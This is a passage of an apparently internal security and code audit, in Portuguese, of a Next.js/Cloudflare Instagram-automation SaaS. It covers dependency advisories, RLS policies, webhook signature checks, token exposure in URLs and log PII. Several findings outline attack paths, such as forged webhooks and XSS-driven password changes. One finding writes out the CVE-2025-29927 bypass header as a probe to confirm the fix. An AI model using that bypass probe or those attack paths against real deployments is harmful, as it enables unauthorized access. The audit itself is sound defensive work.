**O que é:** `npm audit --json` em 2026-10-28: 5 critical, 12 high, 11 moderate, 6 low (197 pacotes de produção, 617 de dev). Por pacote: PRODUÇÃO (código que vai para o Worker): `next` 14.2.35 (25 advisories, ver achado dedicado), `zod` 3.25.76 (GHSA-mrhx-c7xc-m3w5, high, fix só em 4.6.6; ver achado dedicado), `qs` 6.16.0 via `stripe` (GHSA-6pq8-jhm2-2vcw, moderate; o stripe usa `arrayFormat: 'indices'/'repeat'` em `node_modules/stripe/cjs/utils.js:32`, nunca 'comma' -> não exposto), `nanoid` 3.3.15 e `source-map-js` 1.2.1 (marcados prod mas só chegam via o `postcss` 8.4.31 embutido no `next`, usado em build). TEMPLATE DO WORKER (devDependency que vira código de produção no bundle): `@opennextjs/cloudflare` 1.14.10 (GHSA-c7mq-gh6q-6q7c SSRF /cdn-cgi, GHSA-2vc4-c4r6-p6v6 cache interception; ver achados dedicados). SÓ DEV/BUILD: `vitest` 2.1.9 + `tinypool` 1.1.1 (2 critical: RCE por prototype pollution ao rodar testes), `@vitest/mocker`, `vite` 5.4.21, `vite-node`, `esbuild` 0.21.5 (CORS no dev server), `wrangler` 4.131.2 + `miniflare` 5.2026* + `undici` 7.29.0 (18 advisories) + `sharp` 0.35.4 (librsvg), `@opennextjs/aws` 3.9.10 -> `@aws-sdk/*`, `@smithy/*`, `fast-xml-parser` 4.2.5 (critical, só é carregado no build para invalidar CloudFront), `uuid` 9.0.1, `postcss` 8.5.16 + `postcss-selector-parser`, `body-parser`/`express`/`proxy-addr` (servidor de preview), `brace-expansion`. Nenhuma dessas de dev tem código no Worker publicado.

**Como acontece:** Sem caminho de ataque direto para as de dev: só afetam a máquina do desenvolvedor/CI ao rodar `vitest`, `wrangler dev` ou o build. As de produção estão detalhadas nos outros achados.

**Evidência:** npm audit metadata: {critical:5, high:12, moderate:11, low:6, total:34}; package-lock.json marca `dev: true` em vitest, vite, wrangler, miniflare, undici, sharp, @opennextjs/aws, fast-xml-parser, postcss, express; `qs` é dependência de `stripe` (`^6.11.0`).

**Recomendação:** Rodar `npm update` para o que tem fix sem major (wrangler 4.154.0, @opennextjs/cloudflare 1.20.14 que também puxa @opennextjs/aws/aws-sdk/fast-xml-parser novos, postcss 8.5.2x, brace-expansion, nanoid, source-map-js); tratar vitest 5 e zod 4 como upgrades com major planejados. Adicionar `npm audit --omit=dev --audit-level=high` a um passo de CI para separar o ruído de dev do que realmente roda no Worker.

### A1-045 [info] createFolder/savePreset não validam enum e ids em runtime
`src/app/(dashboard)/rules/folders-actions.ts:40` · config · ⚠️ não verificado

**O que é:** createFolder grava input.color sem conferir FOLDER_COLORS (a UI cai no cinza via folderDotClass, então sem impacto visual além de dado inconsistente) e accountId sem validar uuid; savePreset grava `scope` sem conferir contra AiFieldKind (presets-actions.ts:45) e a tabela message_presets não tem check de scope. renameFolder/deleteFolder/deletePreset recebem ids sem validação. O RLS cobre a posse em todos os casos; fica só a falta de hardening de entrada (ids inválidos geram erro de cast no Postgres, mascarado por mensagem genérica).

**Como acontece:** Chamada direta com color 'qualquer' ou scope 'x' → linha gravada com valor fora do catálogo; ids não-uuid → erro 22P02 no Postgres devolvido como mensagem genérica.

**Evidência:** folders-actions.ts:40-46 insert com `color: input.color`; presets-actions.ts:43-47 insert com `...normalized.preset` (scope repassado de normalizePreset sem enum); migration 0014:18 `scope text not null` sem check.

**Recomendação:** Validar com zod (z.enum(FOLDER_COLORS), z.enum das chaves de AI_FIELD_SPECS, z.string().uuid() para ids/accountId) e opcionalmente adicionar check constraints no banco.

### A3-039 [info] Presets: scope não é validado no servidor e a listagem mistura todas as contas do usuário
`src/app/(dashboard)/rules/presets-actions.ts:45` · bug · ⚠️ não verificado

**O que é:** savePreset grava `input.scope` como veio do cliente (coluna text sem check; normalizePreset não valida contra AiFieldKind). listPresets não filtra por account_id: a RLS limita ao usuário, mas um texto salvo na conta A aparece no builder da conta B (presetsForField usa só o limite de caracteres e o scope). Não há exposição entre usuários (RLS da 0014 com check por ig_accounts.user_id confirmada), só inconsistência de dados.

**Como acontece:** Chamada direta a savePreset com `scope: "qualquer"` grava linha com escopo inválido; a UI continua funcionando, mas a ordenação por escopo deixa de valer. Dono de várias contas vê presets de uma conta ao editar automação de outra.

**Evidência:** presets-actions.ts:45 `.insert({ account_id: input.accountId, ...normalized.preset })` com scope sem validação; presets-actions.ts:21-25 lista sem `.eq("account_id", ...)`.

**Recomendação:** Validar scope com z.enum das chaves de AI_FIELD_SPECS e accountId com z.string().uuid(); decidir se presets são por conta (filtrar listPresets pela conta em edição) ou por usuário (então remover account_id da chave e da RLS).

### A0-047 [info] Registro de ações limitado às últimas 50 entradas, sem paginação nem filtro por cliente/admin
`src/app/admin/page.tsx:52` · optimization · ⚠️ não verificado

**O que é:** A aba Registro faz `.limit(50)` fixo e não oferece paginação, busca por cliente ou por admin, nem exportação. Com uso normal (cada convite gera 2 entradas), 50 linhas cobrem poucos dias; investigar 'quem bloqueou X e quando' exige SQL Editor no Supabase, o que vai contra a ideia de o painel ser a interface de auditoria. Não há índice por target_user_id/admin_id para suportar esse filtro.

**Como acontece:** Admin precisa confirmar o histórico de um cliente após uma reclamação → só vê os 50 eventos mais recentes → precisa do runbook e do SQL Editor.

**Evidência:** page.tsx:48-52 `.from("admin_audit_log").select("*").order("created_at", { ascending: false }).limit(50);` ; 0021:38-39 só `admin_audit_log_created_idx`.

**Recomendação:** Paginação por cursor em created_at/id e filtro `?user=<uuid>` (com índice em target_user_id) e `?admin=<uuid>`; link da linha do cliente em /admin/clientes para o histórico dele.

### A0-043 [info] Assinatura calculada sobre o corpo re-codificado (text) em vez dos bytes brutos
`src/app/api/webhooks/meta/route.ts:29` · webhook · ⚠️ não verificado

**O que é:** A rota usa `request.text()` e `verifyMetaSignature` recalcula o HMAC com `.update(rawBody, "utf8")`. Para JSON UTF-8 válido (o que a Meta envia, normalmente com escapes `\uXXXX`) o round-trip é byte-a-byte idêntico, então hoje funciona. Se a Meta algum dia enviar bytes que não sejam UTF-8 válido (ou um BOM), a decodificação substitui por U+FFFD e a assinatura passa a falhar com 401 em todos os eventos — e não há teste automatizado de `verify.ts` (não existe `verify.test.ts`) que alerte sobre isso.

**Como acontece:** Não é explorável por atacante (só pode causar rejeição, nunca aceitação). Cenário: mudança de encoding do lado da Meta → todos os webhooks rejeitados com 401 silenciosamente até alguém olhar o log.

**Evidência:** route.ts l.29 `const rawBody = await request.text()`; verify.ts l.24-26 `.update(rawBody, "utf8")`.

**Recomendação:** Ler `await request.arrayBuffer()`, verificar o HMAC sobre o `Buffer` e só então decodificar para JSON; adicionar teste unitário de `verifyMetaSignature` (header ausente, prefixo errado, hex inválido, segredo ausente, assinatura válida).

### A2-041 [info] Comparação de META_VERIFY_TOKEN e CRON_SECRET com === (não timing-safe)
`src/app/api/webhooks/meta/route.ts:19` · security · ⚠️ não verificado

**O que é:** A verificação do hub.verify_token (GET do webhook) e dos segredos de cron (sequences:30, purge:14) usa comparação de string comum. Na prática, a variância de rede do Worker torna um ataque de timing pouco viável, e o verify_token só serve para confirmar a URL no painel da Meta, mas é uma prática padrão barata de corrigir. Se META_VERIFY_TOKEN estiver indefinida, `params.get()` devolve null e nunca bate com undefined, então não há bypass. O achado sobre o CRON_SECRET na query string cobre o vetor mais relevante das rotas de cron.

**Como acontece:** Atacante tenta inferir o segredo byte a byte medindo tempo de resposta; irrealista no Worker, mas o custo de fechar é nulo.

**Evidência:** route.ts:19 `params.get("hub.verify_token") === process.env.META_VERIFY_TOKEN`

**Recomendação:** Usar um helper `safeEqual(a, b)` com `timingSafeEqual` sobre buffers de mesmo comprimento (já disponível via node:crypto com nodejs_compat) nas três rotas.

### A0-045 [info] setPassword troca a senha de qualquer sessão logada sem senha atual nem reautenticação
`src/app/definir-senha/actions.ts:69` · security · ⚠️ não verificado

**O que é:** Quando o formulário chega sem token_hash/type, a action usa a sessão dos cookies e chama `updateUser({ password })` direto. Isso é o comportamento padrão do Supabase Auth (qualquer sessão válida pode trocar a própria senha), e a ação está protegida contra CSRF pela checagem de Origin das server actions, então não é um bug do app; fica registrado porque, somado aos cookies legíveis por JavaScript (achado dos cabeçalhos, A0-005), um XSS vira troca de senha e bloqueio permanente do dono da conta em uma chamada.

**Como acontece:** Sessão roubada (XSS ou cookie copiado) → POST da action setPassword com `password`/`confirm` e sem os campos de token → senha trocada; o titular perde o acesso até usar 'Esqueci minha senha'.

**Evidência:** src/app/definir-senha/actions.ts:69-76 `const { data: { user } } = await supabase.auth.getUser(); if (!user) return {...}; const { error } = await supabase.auth.updateUser({ password });`.

**Recomendação:** Avaliar no painel do Supabase a opção 'Secure password change' (exige login recente ou reautenticação por nonce) e manter a retentativa por sessão só dentro de uma janela curta após o verifyOtp (ex.: cookie de curta duração marcado pela própria action), em vez de aceitar qualquer sessão. A confirmar na configuração do Supabase.

### A0-046 [info] revokeCourtesy e unblockUser leem access_grants duas vezes por chamada
`src/lib/admin/grants.ts:121` · optimization · ⚠️ não verificado

**O que é:** revokeCourtesy (linha 121) e unblockUser (linha 149) chamam currentGrant para validar o tipo e em seguida writeWithAudit (linha 66) chama currentGrant de novo para o mesmo user_id. São duas queries PostgREST onde uma basta; o parâmetro `guard` de writeWithAudit já existe para esse fim.

**Como acontece:** Cada 'Remover cortesia'/'Desbloquear' = 2 SELECTs + 1 DELETE + 1 INSERT em vez de 1 SELECT + 1 DELETE + 1 INSERT.

**Evidência:** grants.ts:121 `const { grant, error } = await currentGrant(admin, input.targetUserId);` seguido de :124 `return writeWithAudit(...)` que em :66 faz `await currentGrant(admin, targetUserId)`.

**Recomendação:** Passar a validação como `guard: (previous) => previous?.kind !== 'courtesy' ? 'Este cliente não tem cortesia.' : null` (e o equivalente para block) e remover a leitura prévia.

### A3-041 [info] Injeção de prompt no botão ✨ fica restrita ao próprio usuário (sem risco entre tenants)
`src/lib/ai/prompt.ts:56` · security · ⚠️ não verificado

**O que é:** instruction, ruleName, keyword e accountUsername entram crus no prompt do usuário, mas vêm do próprio usuário logado, a chave usada é dele (ou da instalação, só para dono/admins) e a resposta é texto exibido como string em React (sem HTML, sem tool-use, sem gravação automática). Mensagens de seguidores nunca entram no prompt. O parser (parse.ts) é robusto e não usa regex vulnerável a ReDoS; timeout de 30 s; endpoint fixo por provedor (providers.ts:35/41) e verify-key com URLs fixas. Não há achado explorável aqui; registrado como verificação.

**Como acontece:** Não há caminho entre tenants: o pior caso é o usuário mandar instruções arbitrárias ao modelo na própria chave.

**Evidência:** prompt.ts:56 `Instrução de quem pediu: ${instruction}.`; provider.ts:69-83 usa `AI_PROVIDERS[config.provider].endpoint` fixo; server.ts:61-63 chave da instalação só com isAdmin.

**Recomendação:** Manter; se no futuro o prompt passar a incluir texto de seguidores (ex.: resumo de conversa), delimitar o conteúdo e tratar como dado.

### A0-044 [info] Purge relê access_grants e subscriptions duas vezes por usuário (trabalho repetido)
`src/lib/billing/purge.ts:55` · optimization · ⚠️ não verificado

**O que é:** Para cada candidato o laço faz: releitura de subscriptions (linha 41), accessGrantOf (linha 52) e depois hasActiveAccess (linha 55), que internamente repete accessGrantOf e a leitura de subscriptions. São 5 consultas por usuário onde 2-3 bastariam. O job roda uma vez por dia sobre poucos usuários, então o custo real é pequeno; vale só como simplificação.

**Como acontece:** Cron diário com N usuários vencidos → ~5N consultas sequenciais ao Supabase mais storage.list/remove por conta.

**Evidência:** const { grant, error: grantError } = await accessGrantOf(deps.admin, row.user_id); ... if (isCourtesyValid(grant, now)) continue; if (await hasActiveAccess(deps.admin, row.user_id, now)) continue;

**Recomendação:** Manter só a releitura de subscriptions + accessGrantOf (cortesia válida e bloqueio já cobertos) e checar isAdmin, removendo a chamada a hasActiveAccess, ou fazer hasActiveAccess aceitar o grant já lido.

### A0-042 [info] Token de acesso do Instagram vai na query string de toda chamada à Graph API
`src/lib/meta/graph.ts:48` · webhook · ⚠️ não verificado

**O que é:** `graphPost` e `graphGet` enviam `access_token=` na URL (l.48 e l.64). URLs costumam ser registradas por proxies, pela observabilidade do Cloudflare (se algum log de fetch for ativado) e por mensagens de erro de bibliotecas; o header `Authorization: Bearer` é aceito pela Graph API e não aparece nesses lugares. Isso roda dentro do webhook para cada envio, perfil de lead e checagem de seguidor.

**Como acontece:** Um log de requisições de saída ligado no Worker (ou um erro de `fetch` que inclua a URL numa versão futura do runtime) expõe tokens de longa duração (60 dias) das contas dos clientes, permitindo enviar DMs em nome deles.

**Evidência:** graph.ts l.48: `${BASE}/${path}?access_token=${encodeURIComponent(accessToken)}`; l.64: `new URLSearchParams({ ...params, access_token: accessToken })`.

**Recomendação:** Enviar o token no header `Authorization: Bearer <token>` e manter a URL sem segredo. Não é vulnerabilidade ativa hoje; é redução de exposição.

### A3-042 [info] Tokens de acesso e client_secret trafegam na query string das chamadas à Graph API
`src/lib/meta/graph.ts:48` · security · ⚠️ não verificado

**O que é:** graphPost/graphGet colocam `access_token` na URL, e getLongLivedToken/refreshLongLivedToken colocam `client_secret` e o token na query de um GET. É o formato documentado pela Meta, mas URLs tendem a cair em logs (proxies, Tail Workers/Logpush se configurados para registrar subrequests, mensagens de erro que incluam a URL). Hoje nenhum log do repo imprime a URL (os erros usam só `json.error.message`), então é hardening, não vazamento confirmado.

**Como acontece:** Se no futuro algum log/handler incluir a URL da requisição que falhou (ex.: `console.error(err)` com um erro que embuta a URL), o token longo do cliente e o segredo do app iriam para os logs do Cloudflare.

**Evidência:** graph.ts:48 `${BASE}/${path}?access_token=${encodeURIComponent(accessToken)}`; graph.ts:64 `new URLSearchParams({ ...params, access_token })`; oauth.ts:88-95 client_secret e access_token na query de GET.

**Recomendação:** Enviar o token no header `Authorization: Bearer` (a Graph API aceita) e manter o client_secret apenas no corpo de POST; garantir que nenhum console.error imprima objetos de erro inteiros de chamadas à Meta.

### A3-038 [info] processPostbackEvent chama getFreshToken duas vezes (possível renovação dupla do token) e humanPause faz uma chamada Graph extra por mensagem
`src/lib/meta/process.ts:696` · optimization · ⚠️ não verificado

**O que é:** No toque em botão com portão de seguidor, `getFreshToken` é chamado na linha 696 e de novo na 729. Quando o token está a menos de 15 dias de vencer, cada chamada faz uma requisição `refresh_access_token` à Meta e um update em ig_accounts: duas renovações no mesmo evento (a 2ª usa o objeto `account` antigo e grava um token diferente do 1º). Em workflows, `humanPause` (runtime.ts:1316-1323) faz um POST `typing_on` aguardado antes de cada mensagem, somando ~0,2–0,5 s por nó além do sleep; a chamada é cosmética e poderia ser disparada sem await.

**Como acontece:** Postback com token perto de expirar → 2 refreshes + 2 updates; workflow de 6 mensagens → 6 chamadas typing_on sequenciais (~2 s) no caminho crítico.

**Evidência:** process.ts:696 `const token = await getFreshToken(admin, account);` e 729 `const token = await getFreshToken(admin, account);`; runtime.ts:1318 `await sendTypingAction(token, recipientId);`.

**Recomendação:** Obter o token uma vez por evento e reutilizar; em humanPause, iniciar `sendTypingAction` sem await e deixá-lo correr durante o `sleep`.

### A2-042 [info] Logs do Worker guardam @ de clientes, ids de leads e mensagens de erro da Meta (PII sob LGPD)
`src/lib/meta/served-account.ts:22` · config · ⚠️ não verificado

**O que é:** Com observability ligada, os console.* vão para o Workers Logs: `[meta] @<usuario> sem assinatura ativa` (served-account.ts:22), `[token] falha ao renovar token de @<usuario>` (token.ts:54), `[process] falha na resposta pública do comentário <id>` (process.ts:984), `[oauth] falha ao inscrever @<usuario>` (callback:88), `[webhook] erro ao processar payload: <err>` (route.ts:49, com stack). Nenhum deles imprime token ou corpo do webhook (conferido), mas o @ do cliente, o estado da assinatura dele e ids de comentários/leads são dados pessoais com retenção na Cloudflare.

**Como acontece:** Quem tem acesso aos logs vê quais clientes estão inadimplentes e quais @ estão conectados; num incidente de conta Cloudflare isso vaza. Não há caminho de ataque direto ao sistema.

**Evidência:** served-account.ts:22 `console.info(`[meta] @${account.ig_username} sem assinatura ativa: evento ignorado`)`

**Recomendação:** Logar ids internos (account.id) em vez de @, ou truncar; nunca logar `err` inteiro (usar `err.message`). Definir retenção curta nos Workers Logs e documentar na política de privacidade que logs operacionais existem.

### A0-041 [info] Dois App Secrets aceitos na validação da assinatura dobram a superfície de forja
`src/lib/meta/verify.ts:18` · webhook · ⚠️ não verificado

**O que é:** `verifyMetaSignature` aceita o HMAC calculado com `INSTAGRAM_APP_SECRET` OU `META_APP_SECRET` (l.18-30) porque, segundo o comentário, não ficou claro qual a Meta usa. Na prática só um deles assina de verdade; o outro é uma chave extra que, se vazar (o `INSTAGRAM_APP_SECRET` também viaja no fluxo OAuth em oauth.ts l.65 e l.90), permite forjar eventos assinados: DMs e comentários inventados para qualquer `ig_user_id` conhecido, disparando respostas automáticas (links, conteúdo) para IGSIDs à escolha do atacante e poluindo o CRM.

**Como acontece:** Vazamento de um dos dois segredos (log, repositório, painel) → atacante monta payload `object: "instagram"` com `entry[].id` da conta de uma vítima e `sender.id` arbitrário, assina com o segredo vazado e envia POST. O webhook aceita, grava em `processed_events`, responde pela conta da vítima. Com só um segredo válido, metade dos vazamentos possíveis não daria em nada.

**Evidência:** verify.ts l.18-21: `const secrets = [process.env.INSTAGRAM_APP_SECRET, process.env.META_APP_SECRET].filter(...)`; l.23 `secrets.some(...)`.

**Recomendação:** Confirmar na configuração/log qual segredo valida as entregas reais (um teste em produção com `wrangler tail` basta) e manter só ele na lista; documentar em `docs/operacao-saas.md` l.476.

### A2-045 [info] CVE-2025-29927 (bypass de middleware via x-middleware-subrequest) está corrigido: Next 14.2.35 >= 14.2.25 e o OpenNext executa o middleware incondicionalmente
`src/middleware.ts:9` · security · ⚠️ não verificado

**O que é:** Confirmação pedida: a versão instalada (14.2.35) é posterior ao fix (14.2.25). No código instalado, `node_modules/next/dist/server/web/adapter.js` não contém mais o trecho vulnerável (`subrequests.includes(params.page) -> NextResponse.next()`); um grep por 'subrequest' em todo `node_modules/next/dist` retorna vazio. Além disso, no deploy via OpenNext o middleware é um bundle externo chamado diretamente pelo Worker (`node_modules/@opennextjs/aws/dist/core/edgeFunctionHandler.js`: `entry.default({ page, request })` para toda request que casa com o matcher), sem o mecanismo interno de sub-request que o CVE abusava. O matcher de `src/middleware.ts:67-70` cobre tudo exceto `_next/static`, `_next/image`, favicon e extensões de imagem; `/api/*` é liberado explicitamente na linha 13 e cada rota de API faz a própria autenticação (fora desta frente).

**Como acontece:** `GET /sistema/dashboard` com header `x-middleware-subrequest: middleware` continua caindo no middleware e sendo redirecionado para /login sem sessão.

**Evidência:** node_modules/next/package.json version 14.2.35; grep -rl subrequest node_modules/next/dist -> vazio; OSV GHSA-f82v-jwr5-mffw: next >=14.0.0 <14.2.25.

**Recomendação:** Nenhuma ação para este CVE. Manter o hábito de reler as advisories do Next a cada upgrade, já que o branch 14 não recebe mais patches (ver achado sobre o Next 14 em fim de vida).

### A3-040 [info] Modelo de IA do usuário sem limite de tamanho
`src/modules/ai-settings/actions.ts:45` · config · ⚠️ não verificado

**O que é:** isValidModelId usa regex `^[\w.:-]+$` / `^[\w.-]+\/[\w.:-]+$` sem limite de comprimento; saveAiSettings grava `model` na coluna text sem max. O valor volta em mensagens de erro (`não encontrou o modelo ${config.model}`) e no corpo de cada chamada ao provedor. Só afeta o próprio usuário.

**Como acontece:** Usuário envia model com 1 MB de caracteres válidos → linha gigante em user_ai_settings, corpo enorme em cada chamada do botão ✨ e toast de erro ilegível.

**Evidência:** actions.ts:45 `if (model && !isValidModelId(model, provider))`; providers.ts:67-72 regex sem `{1,N}`.

**Recomendação:** Limitar model a ~100 caracteres (zod `.max(100)`) e truncar o valor nas mensagens de erro.

### A1-046 [info] Policies usam auth.uid() sem (select auth.uid()): reavaliação por linha (lint auth_rls_initplan do Supabase)
`supabase/migrations/0001_init.sql:196` · optimization · ⚠️ não verificado

**O que é:** Todas as policies escrevem `auth.uid()` diretamente (`user_id = auth.uid()` em ig_accounts/user_ai_settings/subscriptions/access_grants, e `account_id in (select id from public.ig_accounts where user_id = auth.uid())` nas demais). O Postgres chama a função stable por linha avaliada; o Supabase Performance Advisor (regra auth_rls_initplan) recomenda `(select auth.uid())` para virar InitPlan e ser avaliado uma vez por query. Nas policies com subselect em ig_accounts o efeito é pequeno (o subplano é hashed e ig_accounts é pequena), mas nas listagens grandes (interactions, messages, conversations) e nos `select` com RLS ativado isso soma.

**Como acontece:** Página de logs/Inbox lendo milhares de linhas de interactions/messages: a policy é avaliada linha a linha; com `(select auth.uid())` o custo da função some.

**Evidência:** 0001_init.sql:196 `for all using (user_id = auth.uid()) with check (user_id = auth.uid());` e 0001_init.sql:199-204 `account_id in (select id from public.ig_accounts where user_id = auth.uid())`.

**Recomendação:** Numa migration de manutenção, recriar as policies com `(select auth.uid())` e, opcionalmente, uma função `security definer stable` `falow_my_account_ids()` com search_path fixo e execute só para authenticated, usada como `account_id = any(falow_my_account_ids())` para evitar o subselect repetido em 20 policies.

### A3-043 [info] Env e ExecutionContext escritos à mão no worker.ts, fora do typecheck, e wrangler.toml em vez de wrangler.jsonc
`worker.ts:15` · config · ⚠️ não verificado

**O que é:** Item 13 da checklist: `interface Env` manual com `[key: string]: unknown` (worker.ts:15-19) e `ctx: { waitUntil(...) }` improvisado em vez de `ExecutionContext`/`ScheduledController` gerados por `wrangler types` (não existe worker-configuration.d.ts). tsconfig.json:20 exclui worker.ts do `tsc --noEmit`, então o único arquivo que toca a API da plataforma não é tipado. A Cloudflare recomenda `wrangler.jsonc` (recursos novos são JSON-only) e `satisfies ExportedHandler<Env>`.

**Como acontece:** Renomear um binding/secret (ex.: ASSETS, CRON_SECRET) ou mudar a assinatura de scheduled() não gera erro de compilação; o problema só aparece em produção, no log do cron.

**Evidência:** worker.ts:15-19 `interface Env { CRON_SECRET?: string; NEXT_PUBLIC_APP_URL?: string; [key: string]: unknown; }`; worker.ts:24 `async scheduled(controller: { cron: string }, env: Env, ctx: { waitUntil(p: Promise<unknown>): void })`; tsconfig.json:20 `"exclude": ["node_modules", "worker.ts"]`.

**Recomendação:** Rodar `npx wrangler types` (gera Env/Cloudflare types), tipar `scheduled(controller: ScheduledController, env: Env, ctx: ExecutionContext)` e fechar com `satisfies ExportedHandler<Env>`; incluir worker.ts num tsconfig secundário com `types: ["@cloudflare/workers-types"]` e stub para `.open-next/worker.js`; migrar para wrangler.jsonc quando conveniente (sem mudança funcional).
